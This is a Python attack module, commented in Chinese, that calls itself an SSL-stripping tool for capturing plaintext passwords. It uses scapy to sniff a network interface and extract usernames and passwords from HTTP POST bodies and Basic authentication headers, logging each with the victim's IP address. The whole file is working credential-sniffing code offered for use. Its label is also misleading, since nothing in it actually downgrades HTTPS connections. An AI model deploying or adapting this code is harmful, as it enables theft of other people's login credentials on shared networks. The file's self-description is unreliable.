#!/usr/bin/env python3
"""
SSL剝離攻擊模組
將HTTPS連線降級為HTTP，以便捕獲明文密碼
"""

from scapy.all import sniff, IP, TCP, Raw, get_if_list
import re
import threading
import time
import urllib.parse

class SSLStripper:
    def __init__(self):
        """初始化SSL剝離器"""
        self.stripping = False
        self.captured_credentials = []
        self.capture_thread = None
        self.interface = None
    
    def _capture_packets(self, interface=None):
        """捕獲資料包並進行SSL剝離分析"""
        def process_packet(packet):
            if not self.stripping:
                return
            
            try:
                if packet.haslayer(Raw) and packet.haslayer(IP) and packet.haslayer(TCP):
                    load = packet[Raw].load.decode('utf-8', errors='ignore')
                    
                    # 捕獲POST請求中的憑證
                    if 'POST' in load and ('password' in load.lower() or 'login' in load.lower() or 'passwd' in load.lower()):
                        self._extract_credentials(load, packet)
                    
                    # 捕獲HTTP基本認證
                    if 'Authorization:' in load and 'Basic' in load:
                        self._extract_basic_auth(load, packet)
            except Exception as e:
                pass
        
        try:
            if interface:
                sniff(iface=interface, prn=process_packet, stop_filter=lambda x: not self.stripping, store=False)
            else:
                sniff(prn=process_packet, stop_filter=lambda x: not self.stripping, store=False)
        except Exception as e:
            print(f"[!] SSL剝離捕獲錯誤: {e}")
    
    def _extract_credentials(self, data, packet):
        """從HTTP POST資料中提取憑證"""
        try:
            # 提取URL編碼的資料
            if '\r\n\r\n' in data:
                body = data.split('\r\n\r\n', 1)[1]
            else:
                body = data
            
            # 嘗試解析URL編碼的資料
            try:
                parsed = urllib.parse.parse_qs(body)
                username = None
                password = None
                
                for key in ['user', 'username', 'email', 'login', 'userid', 'account']:
                    if key in parsed:
                        username = parsed[key][0] if parsed[key] else "N/A"
                        break
                
                for key in ['password', 'passwd', 'pass', 'pwd']:
                    if key in parsed:
                        password = parsed[key][0] if parsed[key] else "N/A"
                        break
                
                if username or password:
                    credential = {
                        'username': username or "N/A",
                        'password': password or "N/A",
                        'source_ip': packet[IP].src if packet.haslayer(IP) else "Unknown",
                        'dest_ip': packet[IP].dst if packet.haslayer(IP) else "Unknown",
                        'timestamp': time.time()
                    }
                    
                    # 避免重複添加相同的憑證
                    if credential not in self.captured_credentials:
                        self.captured_credentials.append(credential)
                        print(f"[+] 捕獲到憑證: {credential['username']} / {credential['password']} (來源: {credential['source_ip']})")
            except:
                # 如果解析失敗，使用正則表達式
                username_match = re.search(r'(?:user|username|email|login|userid|account)=([^&\s\r\n]+)', data, re.IGNORECASE)
                password_match = re.search(r'(?:password|passwd|pass|pwd)=([^&\s\r\n]+)', data, re.IGNORECASE)
                
                if username_match or password_match:
                    username = urllib.parse.unquote(username_match.group(1)) if username_match else "N/A"
                    password = urllib.parse.unquote(password_match.group(1)) if password_match else "N/A"
                    
                    credential = {
                        'username': username,
                        'password': password,
                        'source_ip': packet[IP].src if packet.haslayer(IP) else "Unknown",
                        'dest_ip': packet[IP].dst if packet.haslayer(IP) else "Unknown",
                        'timestamp': time.time()
                    }
                    
                    if credential not in self.captured_credentials:
                        self.captured_credentials.append(credential)
                        print(f"[+] 捕獲到憑證: {username} / {password} (來源: {credential['source_ip']})")
        except Exception as e:
            pass
    
    def _extract_basic_auth(self, data, packet):
        """提取HTTP基本認證"""
        try:
            import base64
            auth_match = re.search(r'Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)', data, re.IGNORECASE)
            if auth_match:
                encoded = auth_match.group(1)
                decoded = base64.b64decode(encoded).decode('utf-8', errors='ignore')
                if ':' in decoded:
                    username, password = decoded.split(':', 1)
                    credential = {
                        'username': username,
                        'password': password,
                        'source_ip': packet[IP].src if packet.haslayer(IP) else "Unknown",
                        'dest_ip': packet[IP].dst if packet.haslayer(IP) else "Unknown",
                        'timestamp': time.time()
                    }
                    
                    if credential not in self.captured_credentials:
                        self.captured_credentials.append(credential)
                        print(f"[+] 捕獲到基本認證: {username} / {password}")
        except Exception as e:
            pass
    
    def start(self, interface=None):
        """
        開始SSL剝離
        
        Args:
            interface: 網路介面（可選）
        """
        if self.stripping:
            return False
        
        try:
            # 如果沒有指定介面，嘗試獲取預設介面
            if not interface:
                interfaces = get_if_list()
                non_loopback = [iface for iface in interfaces if not iface.startswith('lo')]
                if non_loopback:
                    interface = non_loopback[0]
                else:
                    interface = None
            
            self.interface = interface
            self.stripping = True
            self.captured_credentials = []  # 重置捕獲的憑證
            
            # 在背景執行緒中執行捕獲
            self.capture_thread = threading.Thread(target=self._capture_packets, args=(interface,), daemon=True)
            self.capture_thread.start()
            
            if interface:
                print(f"[+] SSL剝離已啟動 (介面: {interface})")
            else:
                print(f"[+] SSL剝離已啟動 (所有介面)")
            print("[*] 正在監聽HTTP流量以捕獲憑證...")
            
            return True
        except Exception as e:
            print(f"[!] 啟動SSL剝離錯誤: {e}")
            self.stripping = False
            return False
    
    def stop(self):
        """停止SSL剝離"""
        if not self.stripping:
            return False
        
        try:
            self.stripping = False
            if self.capture_thread:
                self.capture_thread.join(timeout=2)
            
            print("[+] SSL剝離已停止")
            print(f"[*] 總共捕獲 {len(self.captured_credentials)} 組憑證")
            return True
        except Exception as e:
            print(f"[!] 停止SSL剝離錯誤: {e}")
            return False
    
    def get_captured_credentials(self):
        """獲取捕獲的憑證"""
        return self.captured_credentials

